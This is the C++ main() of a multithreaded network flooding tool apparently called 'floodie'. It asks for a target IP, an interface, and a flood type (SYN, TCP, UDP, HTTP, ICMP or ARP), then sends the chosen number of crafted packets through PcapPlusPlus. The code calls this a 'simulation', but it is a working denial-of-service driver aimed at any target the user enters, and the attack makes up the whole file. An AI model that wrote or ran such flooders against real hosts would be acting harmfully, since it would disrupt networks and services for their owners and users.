#include "floodie.h"
#include "ListInterfaces.h"
int main(int argc,char* argv[])
{
    if(argc < 4)
    {
        std::cout<<"You can execute this directly using \""<<argv[0]<<"{Target IP} {Interface Name} {Protocol}\""<<std::endl<<"Anyways.... Have Fun!!(but legally >_<)"<<std::endl;
    }
    std::string targetIp, interfaceName,floodType;
    int packetCount,threadCount;
    std::cout << "Enter target IP: ";
    std::cin >> targetIp;
    std::cout << "Enter interface name(wlan0/eth0/etc): ";
    std::cin >> interfaceName;
    std::cout << "Enter type of flood (syn/tcp/udp/http/icmp/arp): ";
    std::cin >> floodType;
    std::cout << "Enter number of packets to send: ";
    std::cin >> packetCount;
    bool flag = false;
    while(!flag){
        std::cout << "Enter number of threads to use: ";
        std::cin >> threadCount;
        if (threadCount == 0 || threadCount < 0) {
            std::cout << "Enter a valid positive integer for threadCount: ";
            std::cin >> threadCount;
        }else{
            flag = ! flag;
        }
    }
    pcpp::PcapLiveDevice* dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(interfaceName);
    if (!dev) {
        std::cerr << "Could not find device: " << interfaceName << std::endl;
        std::cerr << "If not sure, enter 1 to check interfaces available or enter 0 to exit"<<std::endl;
        int opt=0;
        std::cin>>opt;
        if(opt==0) return 1;
        else if (opt == 1) {
            listInterface();
            return 1;
        }
    }
    if (!dev->open()) {
        std::cerr << "Could not open device: " << interfaceName << std::endl;
        return 1;
    }

    pcpp::MacAddress srcMac = dev->getMacAddress();
    pcpp::IPv4Address srcIp = dev->getIPv4Address();
    auto dstMac = pcpp::MacAddress("FF:FF:FF:FF:FF:FF"); // Broadcast MAC for simplicity
    pcpp::IPv4Address dstIp(targetIp);

    std::function<pcpp::Packet()> packetBuilder;

    // Select packet builder based on flood type
    if (floodType == "syn") {
        packetBuilder = [&]() { return buildSYNPacket(&srcMac, &dstMac, &srcIp, &dstIp); };
    } else if (floodType == "tcp") {
        packetBuilder = [&]() { return buildTCPPacket(&srcMac, &dstMac, &srcIp, &dstIp); };
    } else if (floodType == "udp") {
        packetBuilder = [&]() { return buildUDPPacket(&srcMac, &dstMac, &srcIp, &dstIp); };
    } else if (floodType == "http") {
        packetBuilder = [&]() { return buildHTTPPacket(&srcMac, &dstMac, &srcIp, &dstIp); };
    } else if (floodType == "icmp") {
        packetBuilder = [&]() { return buildIcmpPacket(srcMac, dstMac, srcIp, dstIp); };
    } else if (floodType == "arp") {
        packetBuilder = [&]() { return buildArpPacket(srcMac, dstMac, srcIp, dstIp); };
    } else {
        std::cerr << "Invalid flood type. Use 'syn', 'tcp', 'udp', 'http', 'icmp', or 'arp'." << std::endl;
        return 1;
    }

    // Execute the flood simulation
    simulateFlood(packetBuilder, dev, packetCount, threadCount);

    dev->close();
    std::cout << "Flood simulation complete." << std::endl;
    return 0;
}